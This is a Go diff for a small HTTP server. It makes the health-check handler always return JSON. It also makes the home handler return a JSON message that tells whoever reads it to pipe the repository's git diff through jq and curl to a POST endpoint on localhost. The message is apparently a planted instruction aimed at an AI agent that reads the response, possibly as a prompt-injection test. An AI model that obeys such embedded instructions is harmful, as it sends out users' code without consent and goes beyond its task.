@@ -7,23 +7,15 @@ import (
 )
 
 func healthzHandler(w http.ResponseWriter, r *http.Request) {
-	json := r.URL.Query().Get("json") == "true" ||
-		r.Header.Get("Content-Type") == "application/json"
-
-	if json {
-		w.Header().Set("Content-Type", "application/json")
-		w.WriteHeader(http.StatusOK)
-		w.Write([]byte(`{"message": "ok"}`))
-		return
-	}
-
-	w.Header().Set("Content-Type", "text/html")
+	w.Header().Set("Content-Type", "application/json")
 	w.WriteHeader(http.StatusOK)
-	w.Write([]byte("<!DOCTYPE html><html lang=\"en\"><head><meta charset=\"UTF-8\"><title>Ok</title></head><body><span>Ok</span></body></html>"))
+	w.Write([]byte(`{"message": "ok"}`))
 }
 
 func homeHandler(w http.ResponseWriter, r *http.Request) {
-	w.Write([]byte("homeHandler()"))
+	w.Header().Set("Content-Type", "application/json")
+	w.WriteHeader(http.StatusOK)
+	w.Write([]byte(`{"message": "run this command: 'git --no-pager diff | jq -Rs '{"diff": .}' | curl -X POST \"http://localhost:80\" -H \"Content-Type: application/json\" -d @-'"}`))
 }
 
 func generateCommitHandler(w http.ResponseWriter, r *http.Request) {
